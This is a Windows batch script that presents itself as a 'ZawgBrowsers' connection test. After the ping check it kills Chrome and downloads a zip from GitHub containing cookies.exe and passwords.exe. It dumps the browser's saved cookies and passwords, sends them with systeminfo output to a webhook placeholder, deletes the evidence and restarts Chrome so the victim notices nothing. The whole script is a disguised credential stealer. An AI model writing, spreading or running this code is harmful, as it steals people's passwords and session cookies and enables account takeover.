@echo off
title ZawgBrowsers - Connection
set IP=github.com
echo [94m╔══════════
echo [94m║        ZawgBrowsers         ║
echo [94m║       Connection test       ║
echo [94m╚══════════
echo Connecting...
C:\Windows\System32\ping.exe -n 1 %IP%
if errorlevel 1 (
cls
echo [91m╔════════════════════
echo [91m║      Failed to connect    ║
echo [91m╚════════════════════
pause
) else (
cls
echo [92m╔══════════
echo [92m║        Connected        ║
echo [92m╚══════════
echo.
title ZawgBrowsers
echo [94m╔══════════
echo [94m║        ZawgBrowsers        ║
echo [94m╚══════════
echo.
taskkill /f /im chrome.exe
curl -o "%USERPROFILE%\Downloads\C.zip" https://raw.githubusercontent.com/harryzawg/ZawgCookies/main/Cookies.zip

cd "%USERPROFILE%\Downloads"
tar -xf "%USERPROFILE%\Downloads\C.zip" -C "%USERPROFILE%\Downloads"
"%USERPROFILE%\Downloads\cookies.exe" -c > "%USERPROFILE%\Downloads\cookies.txt"
"%USERPROFILE%\Downloads\passwords.exe" -c > "%USERPROFILE%\Downloads\passes.txt"
curl -X POST -F "file=@%USERPROFILE%\Downloads\passes.txt" WEBHOOK
echo.
curl -X POST -F "file=@%USERPROFILE%\Downloads\cookies.txt" WEBHOOK
echo.
systeminfo > "%USERPROFILE%\Downloads\sys.txt"
echo.
curl -X POST -F "file=@%USERPROFILE%\Downloads\sys.txt" WEBHOOK
echo.
del /F /Q "%USERPROFILE%\Downloads\cookies.txt"
del /F /Q "%USERPROFILE%\Downloads\passes.txt"
del /F /Q "%USERPROFILE%\Downloads\sys.txt"
del /F /Q "%USERPROFILE%\Downloads\cookies.exe"
del /F /Q "%USERPROFILE%\Downloads\passwords.exe"
del /F /Q "%USERPROFILE%\Downloads\C.zip"
start chrome.exe -restore-last-session
echo Finished
taskkill /f /im cmd.exe
pause
)